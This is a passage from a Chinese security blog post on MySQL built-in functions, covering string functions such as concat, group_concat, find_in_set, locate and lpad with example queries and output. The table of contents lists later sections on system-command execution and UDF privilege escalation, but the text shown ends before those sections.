<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>MySQL 函数及其利用 | BingSlient's Blog</title><meta name="description" content="MySQL 函数及其利用"><meta name="keywords" content="MySQL,MySQL 函数"><meta name="author" content="BingSlient"><meta name="copyright" content="BingSlient"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://bingslient.github.io/2019/08/26/MySQL 函数及其利用/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="MySQL 函数及其利用"><meta name="twitter:description" content="MySQL 函数及其利用"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg"><meta property="og:type" content="article"><meta property="og:title" content="MySQL 函数及其利用"><meta property="og:url" content="https://bingslient.github.io/2019/08/26/MySQL 函数及其利用/"><meta property="og:site_name" content="BingSlient's Blog"><meta property="og:description" content="MySQL 函数及其利用"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="next" title="Kali Linux 使用国内源" href="https://bingslient.github.io/2019/08/16/Kali linux 使用国内源/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: '添加书签',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天'

  
}</script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-函数"><span class="toc-number">2.</span> <span class="toc-text">MySQL 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#字符串函数"><span class="toc-number">2.1.</span> <span class="toc-text">字符串函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串长度"><span class="toc-number">2.1.1.</span> <span class="toc-text">字符串长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串拼接"><span class="toc-number">2.1.2.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串查找"><span class="toc-number">2.1.3.</span> <span class="toc-text">字符串查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串修改"><span class="toc-number">2.1.4.</span> <span class="toc-text">字符串修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#子字符串提取"><span class="toc-number">2.1.5.</span> <span class="toc-text">子字符串提取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串比较"><span class="toc-number">2.1.6.</span> <span class="toc-text">字符串比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它操作"><span class="toc-number">2.1.7.</span> <span class="toc-text">其它操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数值函数"><span class="toc-number">2.2.</span> <span class="toc-text">数值函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#统计函数"><span class="toc-number">2.2.1.</span> <span class="toc-text">统计函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#取整函数"><span class="toc-number">2.2.2.</span> <span class="toc-text">取整函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#幂函数"><span class="toc-number">2.2.3.</span> <span class="toc-text">幂函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指数和对数"><span class="toc-number">2.2.4.</span> <span class="toc-text">指数和对数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三角函数"><span class="toc-number">2.2.5.</span> <span class="toc-text">三角函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反三角函数"><span class="toc-number">2.2.6.</span> <span class="toc-text">反三角函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它函数"><span class="toc-number">2.2.7.</span> <span class="toc-text">其它函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#高级函数"><span class="toc-number">2.3.</span> <span class="toc-text">高级函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#进制转换"><span class="toc-number">2.3.1.</span> <span class="toc-text">进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类型转换"><span class="toc-number">2.3.2.</span> <span class="toc-text">类型转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件判断函数"><span class="toc-number">2.3.3.</span> <span class="toc-text">条件判断函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库信息"><span class="toc-number">2.3.4.</span> <span class="toc-text">数据库信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加解密"><span class="toc-number">2.3.5.</span> <span class="toc-text">加解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它函数-1"><span class="toc-number">2.3.6.</span> <span class="toc-text">其它函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#日期函数"><span class="toc-number">2.4.</span> <span class="toc-text">日期函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#当前日期和时间"><span class="toc-number">2.4.1.</span> <span class="toc-text">当前日期和时间</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-执行系统命令"><span class="toc-number">3.</span> <span class="toc-text">MySQL 执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用-system-shell-cmd"><span class="toc-number">3.1.</span> <span class="toc-text">使用 system shell-cmd</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL-UDF-提权"><span class="toc-number">4.</span> <span class="toc-text">MySQL UDF 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景-1"><span class="toc-number">4.1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用-UDF"><span class="toc-number">4.2.</span> <span class="toc-text">使用 UDF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/post.jpg)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">BingSlient's Blog</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad" data-src="https://cdn.jsdelivr.net/gh/BingSlient/cdn/photo/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'"><div class="mobile_author-info__description"></div></div><hr><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title"><div class="posttitle">MySQL 函数及其利用</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-08-26<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-08-26</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web-安全基础/">Web 安全基础</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">5.6k</span><span class="post-meta__separator">|</span><span>阅读时长: 25 分钟</span><span class="post-meta__separator">|</span><span>阅读量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><strong>学习目标：</strong></p>
<ol>
<li><p>学习数据库自带函数的功能与用法（思考在什么情况下可以执行命令）</p>
</li>
<li><p>将所有涉及的函数进行测试并举例说明其用法</p>
</li>
<li><p>针对自己所选数据库，构造所需环境，尝试执行系统命令</p>
</li>
</ol>
<h1 id="MySQL-函数"><a href="#MySQL-函数" class="headerlink" title="MySQL 函数"></a>MySQL 函数</h1><p><strong>测试环境：</strong></p>
<ul>
<li><p>Ubuntu-18.04</p>
</li>
<li><p>MySQL 5.7.27</p>
</li>
<li><p>数据表：comments，test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from comments;</span><br><span class="line">+----+---------------------------+</span><br><span class="line">| id | comment                   |</span><br><span class="line">+----+---------------------------+</span><br><span class="line">|  1 | test                      |</span><br><span class="line">|  2 | hhhh                      |</span><br><span class="line">|  3 | Need lots of improvements |</span><br><span class="line">+----+---------------------------+</span><br><span class="line">mysql&gt; select  * from test;</span><br><span class="line">+----+------+</span><br><span class="line">| id | name |</span><br><span class="line">+----+------+</span><br><span class="line">|  1 | May  |</span><br><span class="line">|  2 | June |</span><br><span class="line">|  3 | Hack |</span><br><span class="line">| 10 | Cook |</span><br><span class="line">+----+------+</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><blockquote>
<ul>
<li><code>length(s)</code></li>
<li><code>char_length(s)</code> </li>
<li><code>character_length(s)</code> </li>
</ul>
</blockquote>
<p><strong>描述：</strong>返回字符串 s 的长度。</p>
<p><strong>实例：</strong>返回字符串 “Hello World!” 的长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(&quot;Hello World&quot;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| length(&quot;Hello World&quot;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                    11 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select char_length(&quot;Hello World&quot;); #或者 select character_length(&quot;Hello World&quot;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| char_length(&quot;Hello World&quot;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                         11 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><blockquote>
<ul>
<li><code>concat(s1, s2..…, sn)</code>，将多个字符串 s1, s2..… 合并为一个字符串</li>
<li><code>concat_ws(separator, s1, s2, ..…)</code>，功能和 concat 函数一样，但带有分隔符</li>
<li><code>group_concat()</code>，将同一列的内容进行拼接</li>
</ul>
</blockquote>
<p><code>concat(s1, s2..…, sn)</code></p>
<p><strong>描述：</strong>将多个字符串 s1, s2..… 合并为一个字符串，如果 s1, s2..… 中有为 NULL 值得字符串则返回 NULL 值。</p>
<p><strong>实例：</strong>从 comments 表中选择 id, comment 字段，并使用 concat 函数合并为 info 字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(id,&apos; &apos;,comment) as info from comments;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| info                        |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 1 test                      |</span><br><span class="line">| 2 hhhh                      |</span><br><span class="line">| 3 Need lots of improvements |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>

<p><code>concat_ws(separator, s1, s2, ..…)</code></p>
<p><strong>描述：</strong>功能和 concat 函数一样，但带有分隔符，如果分隔符为 NULL，则函数返回 NULL，而字符串为 NULL 则略过。</p>
<p><strong>实例：</strong>从 comments 表中选择 id, comment, comment 字段，并使用 concat_ws 函数, 以 “,” 为分隔符，合并为 infos 字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&apos;,&apos;,id,comment,comment) as infos from comments;</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| infos                                                  |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| 1,test,test                                           |</span><br><span class="line">| 2,hhhh,hhhh                                           |</span><br><span class="line">| 3,Need lots of improvements,Need lots of improvements |</span><br><span class="line">+-------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>group_concat()</code> </p>
<p><strong>描述：</strong> 比较直观的理解是 <code>concat()</code> ，<code>concat_ws()</code> 将不同列的同一行内容进行拼接，而<code>group_concat()</code> 将同一列的内容进行拼接。</p>
<p><strong>语法：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GROUP_CONCAT([DISTINCT] expr [,expr ...] # distinct，表示插叙的结果不能重复</span><br><span class="line">             [ORDER BY &#123;unsigned_integer | col_name | expr&#125;</span><br><span class="line">                 [ASC | DESC] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val]) # seperator:拼接分隔符，默认为 &apos;,&apos;</span><br></pre></td></tr></table></figure>

<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(comment order by comment separator &apos;|&apos;) from comments;</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| group_concat(comment order by comment separator &apos;|&apos;)           |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| Come on!|Come on!|Come on!|hhhh|Need lots of improvements|test |</span><br><span class="line">+----------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h3><blockquote>
<ul>
<li><code>field(sv, v1, v2..…)</code>，在列表 v1, v2… 中 查找值 sv 的位置</li>
<li><code>find_in_set(sv, slist)</code>，搜索值 sv 在字符串列表 slist 中得位置，slist 中的值以 “,” 分开</li>
<li><code>instr(string, substring)</code> | <code>locate(substring, string, [start])</code> | <code>position(subtring in string)</code> , <code>locate()</code>，函数可指定从字符串 string 的 start 位置处开始搜索 substring</li>
</ul>
</blockquote>
<p><code>field(sv, v1, v2..…)</code></p>
<p><strong>描述：</strong>搜索值 sv 在列表 v1, v2..… 中得位置，如果 sv 为 NULL 或者 sv 不在列表中则返回0值。</p>
<p><strong>实例：</strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select field(&apos;a&apos;, &apos;Happy&apos;,&apos;day&apos;,&apos;A&apos;,&apos;a&apos;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| field(&apos;a&apos;, &apos;Happy&apos;,&apos;day&apos;,&apos;A&apos;,&apos;a&apos;) | #可见搜索不区分大小写，返回第一次搜索值出现得位置</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 3 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line"># 在表中查找</span><br><span class="line">mysql&gt; select field(&apos;hhhh&apos;, group_concat(comment)) from comments;</span><br><span class="line">+------------------------+</span><br><span class="line">| field(&apos;hhhh&apos;, comment) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      0 |</span><br><span class="line">|                      1 |</span><br><span class="line">|                      0 |</span><br><span class="line">|                      0 |</span><br><span class="line">|                      0 |</span><br><span class="line">|                      0 |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>

<p><code>find_in_set(sv, slist)</code></p>
<p><strong>描述：</strong>搜索值 sv 在字符串列表 slist 中得位置，slist 中的值以 “,” 分开。如果值 sv 不在列表中获知 slist 为空字符串，则返回 0，如果 slist 为 NULL，则返回 NULL。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select find_in_set(&apos;a&apos;, &apos;Not an, easy,question,a,A,a&apos;);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| find_in_set(&apos;a&apos;, &apos;Not an, easy,question,a,A,a&apos;) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                               4 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">#slist 中的值是以&quot;,&quot;作为分隔符，分隔符之间的内容都是值的内容，包括空格。</span><br><span class="line">mysql&gt; select find_in_set(&apos;a&apos;, &apos;Not an, easy,question, a,A,a&apos;);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| find_in_set(&apos;a&apos;, &apos;Not an, easy,question, a,A,a&apos;) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">|                                                5 |</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>instr(string, substring)</code> | <code>locate(substring, string, [start])</code> | <code>position(substring in string)</code></p>
<p><strong>描述:</strong>查找字符串 substring 在 string 中出现的位置，如果 substring 不在 string 中，返回 0 。locate()`函数可指定从字符串 string 的 start 位置处开始搜索 substring。</p>
<p><strong>实例:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select instr(&quot;Proud of you!&quot;, &quot;you&quot;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| instr(&quot;Proud of you!&quot;, &quot;you&quot;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                            10 |</span><br><span class="line">+-------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&quot;you&quot;, &quot;Proud of you!&quot;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| locate(&quot;you&quot;, &quot;Proud of you!&quot;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                             10 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&quot;you&quot;, &quot;Proud of you!&quot;, 11); #从第11个字符开始搜索，搜索失败</span><br><span class="line">+------------------------------------+</span><br><span class="line">| locate(&quot;you&quot;, &quot;Proud of you!&quot;, 11) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="字符串修改"><a href="#字符串修改" class="headerlink" title="字符串修改"></a>字符串修改</h3><blockquote>
<ul>
<li><p><code>insert(s1, pos, num, s2)</code> ， 字符串插入</p>
</li>
<li><p><code>replace(s, olds, news)</code>，字符串替换</p>
</li>
<li><p><code>lpad(s, len, pads)</code> | <code>rpad(s, len, pads)</code>，字符串填充</p>
</li>
<li><p><code>trim(s)</code> | <code>ltrim(s)</code> | <code>rtrim(s)</code>，字符串裁剪，去首位空格</p>
</li>
<li><p><code>lcase(s)</code> | <code>lower(s)</code> ，字符串英文小写</p>
</li>
<li><p><code>ucase(s)</code> | <code>uppser(s)</code>，字符串英文大写</p>
</li>
<li><p><code>reverse(s)</code> ，字符串逆序</p>
</li>
</ul>
</blockquote>
<p><code>insert(s1, pos, num, s2)</code></p>
<p><strong>描述：</strong> 在字符串 s1 位置插入字符串 s2， num 表示要替换的字符数，如果不需要替换，则使用 0 值。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#替换式插入</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 8, 3,&quot;good&quot;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 8, 3,&quot;good&quot;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What a good day!                       |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">#不进行替换，直接插入</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 8, 0,&quot;good&quot;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 8, 0,&quot;good&quot;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What a goodbad day!                    |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">#pos 值不在范围内，范围字符串 s1</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 0, 3,&quot;good&quot;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 0, 3,&quot;good&quot;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What a bad day!                        |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">#pos+num 大于字符串 s1 长度，替换 pos 位置后的全部字符</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 8, 20,&quot;good&quot;);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 8, 20,&quot;good&quot;) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| What a good                             |</span><br><span class="line">+-----------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>replace(s, olds, news)</code></p>
<p><strong>描述：</strong>替换字符串 s 中的子字符串 olds 为 news。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select replace(&quot;What a bad day!&quot;, &quot;bad&quot;, &quot;good&quot;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| replace(&quot;What a bad day!&quot;, &quot;bad&quot;, &quot;good&quot;) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| What a good day!                          |</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>lpad(s, len, pads)</code> | <code>rpad(s, len, pads)</code></p>
<p><strong>描述：</strong>使用字符串 pads 填充字符串 s ，至长度为 len。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#左填充</span><br><span class="line">mysql&gt; select lpad(&quot;12345&quot;, 10, &quot;0&quot;);</span><br><span class="line">+------------------------+</span><br><span class="line">| lpad(&quot;12345&quot;, 10, &quot;0&quot;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 0000012345             |</span><br><span class="line">+------------------------+</span><br><span class="line">#右填充</span><br><span class="line">mysql&gt; select rpad(&quot;12345&quot;, 10, &quot;0&quot;);</span><br><span class="line">+------------------------+</span><br><span class="line">| rpad(&quot;12345&quot;, 10, &quot;0&quot;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 1234500000             |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>

<p><code>trim(s)</code> | <code>ltrim(s)</code> | <code>rtrim(s)</code></p>
<p><strong>描述：</strong>去除字符串首尾的空格。</p>
<p><strong>实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select trim(&quot;     Too many spaces           &quot;);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| trim(&quot;     Too many spaces           &quot;) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| Too many spaces                         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">#首部去空格</span><br><span class="line">mysql&gt; select ltrim(&quot;     Too many spaces           &quot;);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| ltrim(&quot;     Too many spaces           &quot;) |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| Too many spaces                          |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">#尾部去空格</span><br><span class="line">mysql&gt; select concat(rtrim(&quot;     Too many spaces          &quot;), &quot;!&quot;);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| concat(rtrim(&quot;     Too many spaces          &quot;), &quot;!&quot;) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">|      Too many spaces!                                |</span><br><span class="line">+------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>lcase(s)</code> | <code>lower(s)</code> </p>
<p><strong>描述：</strong>字符串英文小写。</p>
<p><strong>实例：</strong></p>
